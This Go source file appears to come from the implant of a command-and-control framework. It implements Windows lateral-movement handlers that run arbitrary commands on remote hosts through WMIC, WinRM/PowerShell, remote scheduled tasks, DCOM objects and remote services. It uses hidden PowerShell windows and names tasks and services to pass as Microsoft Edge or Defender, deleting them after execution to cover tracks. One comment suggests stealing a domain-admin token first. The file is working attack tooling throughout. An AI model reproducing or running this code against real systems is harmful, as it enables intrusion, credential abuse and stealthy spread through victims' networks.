//go:build windows

package main

import (
	"fmt"
	"os/exec"
	"strings"
	"time"

	"github.com/mjopsec/taburtuaiC2/pkg/types"
)

func handleLateralWMI(cmd *types.Command, result *types.CommandResult) {
	if cmd.LateralTarget == "" || cmd.LateralCommand == "" {
		result.Error = "lateral_wmi: lateral_target and lateral_command are required"
		result.ExitCode = 1
		return
	}

	args := []string{"/node:" + cmd.LateralTarget}
	if cmd.LateralUser != "" {
		user := cmd.LateralUser
		if cmd.LateralDomain != "" {
			user = cmd.LateralDomain + `\` + user
		}
		args = append(args, "/user:"+user)
		if cmd.LateralPass != "" {
			args = append(args, "/password:"+cmd.LateralPass)
		}
	}
	args = append(args, "process", "call", "create", cmd.LateralCommand)

	out, err := exec.Command("wmic.exe", args...).CombinedOutput()
	if err != nil {
		result.Error = fmt.Sprintf("wmic exec failed: %v\n%s", err, out)
		result.ExitCode = 1
		return
	}
	result.Output = strings.TrimSpace(string(out))
}

func handleLateralWinRM(cmd *types.Command, result *types.CommandResult) {
	if cmd.LateralTarget == "" || cmd.LateralCommand == "" {
		result.Error = "lateral_winrm: lateral_target and lateral_command are required"
		result.ExitCode = 1
		return
	}

	var psScript string
	if cmd.LateralUser != "" {
		user := cmd.LateralUser
		if cmd.LateralDomain != "" {
			user = cmd.LateralDomain + `\` + user
		}
		// Single-quote escape pass for PowerShell
		passEsc := strings.ReplaceAll(cmd.LateralPass, `'`, `''`)
		psScript = fmt.Sprintf(
			`$p = ConvertTo-SecureString '%s' -AsPlainText -Force; `+
				`$c = New-Object PSCredential ('%s', $p); `+
				`Invoke-Command -ComputerName '%s' -Credential $c -ScriptBlock { %s }`,
			passEsc, user, cmd.LateralTarget, cmd.LateralCommand,
		)
	} else {
		psScript = fmt.Sprintf(
			`Invoke-Command -ComputerName '%s' -ScriptBlock { %s }`,
			cmd.LateralTarget, cmd.LateralCommand,
		)
	}

	out, err := exec.Command("powershell.exe",
		"-NoProfile", "-NonInteractive", "-WindowStyle", "Hidden",
		"-Command", psScript,
	).CombinedOutput()
	if err != nil {
		result.Error = fmt.Sprintf("winrm exec failed: %v\n%s", err, out)
		result.ExitCode = 1
		return
	}
	result.Output = strings.TrimSpace(string(out))
}

func handleLateralSchtask(cmd *types.Command, result *types.CommandResult) {
	if cmd.LateralTarget == "" || cmd.LateralCommand == "" {
		result.Error = "lateral_schtask: lateral_target and lateral_command are required"
		result.ExitCode = 1
		return
	}

	taskName := fmt.Sprintf("MicrosoftEdgeUp%d", time.Now().Unix()%9999)
	unc := `\\` + cmd.LateralTarget

	auth := []string{}
	if cmd.LateralUser != "" {
		user := cmd.LateralUser
		if cmd.LateralDomain != "" {
			user = cmd.LateralDomain + `\` + user
		}
		auth = []string{"/U", user, "/P", cmd.LateralPass}
	}

	// Create remote scheduled task
	createArgs := append([]string{
		"/Create", "/S", cmd.LateralTarget,
		"/TN", taskName,
		"/TR", cmd.LateralCommand,
		"/SC", "ONCE",
		"/ST", "00:00",
		"/F",
	}, auth...)
	if out, err := exec.Command("schtasks.exe", createArgs...).CombinedOutput(); err != nil {
		result.Error = fmt.Sprintf("schtask create failed: %v\n%s", err, out)
		result.ExitCode = 1
		return
	}

	// Run it immediately
	runArgs := append([]string{"/Run", "/S", cmd.LateralTarget, "/TN", taskName}, auth...)
	exec.Command("schtasks.exe", runArgs...).Run()

	// Give it a moment, then delete
	time.Sleep(3 * time.Second)
	delArgs := append([]string{"/Delete", "/S", cmd.LateralTarget, "/TN", taskName, "/F"}, auth...)
	exec.Command("schtasks.exe", delArgs...).Run()

	result.Output = fmt.Sprintf("Scheduled task %s created and executed on %s (%s)", taskName, cmd.LateralTarget, unc)
}

// handleLateralDCOM executes a command on a remote host by activating a DCOM
// object over RPC. Three COM classes are supported:
//
//   mmc20        — MMC20.Application.ExecuteShellCommand  (most reliable, default)
//   shellwindows — ShellWindows.Item().Document.Application.ShellExecute
//   shellbrowser — ShellBrowserWindow.Document.Application.ShellExecute
//
// All three are fire-and-forget (output not captured). They run as the
// agent's current impersonation token — steal a DA token first if needed.
func handleLateralDCOM(cmd *types.Command, result *types.CommandResult) {
	if cmd.LateralTarget == "" || cmd.LateralCommand == "" {
		result.Error = "lateral_dcom: lateral_target and lateral_command are required"
		result.ExitCode = 1
		return
	}

	method := cmd.LateralDCOMMethod
	if method == "" {
		method = "mmc20"
	}

	// Escape single quotes for PS single-quoted strings ('' = literal ')
	tgt := strings.ReplaceAll(cmd.LateralTarget, `'`, `''`)
	// For cmd /c argument we embed into a PS single-quoted string — escape ' as ''
	cmdArg := strings.ReplaceAll(cmd.LateralCommand, `'`, `''`)

	var psScript string
	switch method {
	case "mmc20":
		// Win32_MMCApplication.ExecuteShellCommand(Command, Directory, Params, WindowState)
		// WindowState "7" = SW_SHOWMINNOACTIVE (hidden-ish)
		psScript = fmt.Sprintf(
			`$o=[System.Activator]::CreateInstance([System.Type]::GetTypeFromProgID('MMC20.Application','%s'));`+
				`$o.Document.ActiveView.ExecuteShellCommand('cmd.exe',$null,'/c %s','7')`,
			tgt, cmdArg,
		)

	case "shellwindows":
		// CLSID {9BA05972-F6A8-11CF-A442-00A0C90A8F39} — ShellWindows
		psScript = fmt.Sprintf(
			`$o=[System.Activator]::CreateInstance([System.Type]::GetTypeFromCLSID([System.Guid]'9BA05972-F6A8-11CF-A442-00A0C90A8F39','%s'));`+
				`$i=$o.Item();$i.Document.Application.ShellExecute('cmd.exe','/c %s','C:\Windows\System32',$null,0)`,
			tgt, cmdArg,
		)

	case "shellbrowser":
		// CLSID {C08AFD90-F2A1-11D1-8455-00A0C91F3880} — ShellBrowserWindow
		psScript = fmt.Sprintf(
			`$o=[System.Activator]::CreateInstance([System.Type]::GetTypeFromCLSID([System.Guid]'C08AFD90-F2A1-11D1-8455-00A0C91F3880','%s'));`+
				`$o.Document.Application.ShellExecute('cmd.exe','/c %s','C:\Windows\System32',$null,0)`,
			tgt, cmdArg,
		)

	default:
		result.Error = fmt.Sprintf("unknown DCOM method %q — use mmc20|shellwindows|shellbrowser", method)
		result.ExitCode = 1
		return
	}

	out, err := exec.Command(
		"powershell.exe",
		"-NoProfile", "-NonInteractive", "-WindowStyle", "Hidden",
		"-Command", psScript,
	).CombinedOutput()
	if err != nil {
		result.Error = fmt.Sprintf("dcom/%s failed on %s: %v\n%s", method, cmd.LateralTarget, err, out)
		result.ExitCode = 1
		return
	}
	result.Output = fmt.Sprintf("[+] DCOM %s → %s: command dispatched\n%s",
		method, cmd.LateralTarget, strings.TrimSpace(string(out)))
}

func handleLateralService(cmd *types.Command, result *types.CommandResult) {
	if cmd.LateralTarget == "" || cmd.LateralCommand == "" {
		result.Error = "lateral_service: lateral_target and lateral_command are required"
		result.ExitCode = 1
		return
	}

	svcName := fmt.Sprintf("WinDefSvc%d", time.Now().Unix()%9999)
	unc := `\\` + cmd.LateralTarget

	// sc \\host create SvcName binpath= "cmd.exe /c ..."
	out, err := exec.Command("sc.exe", unc, "create", svcName,
		"binpath=", "cmd.exe /c "+cmd.LateralCommand,
		"start=", "demand",
	).CombinedOutput()
	if err != nil {
		result.Error = fmt.Sprintf("sc create failed: %v\n%s", err, out)
		result.ExitCode = 1
		return
	}

	// Start it
	exec.Command("sc.exe", unc, "start", svcName).Run()
	time.Sleep(2 * time.Second)

	// Clean up
	exec.Command("sc.exe", unc, "stop", svcName).Run()
	exec.Command("sc.exe", unc, "delete", svcName).Run()

	result.Output = fmt.Sprintf("Service %s created and started on %s", svcName, cmd.LateralTarget)
}
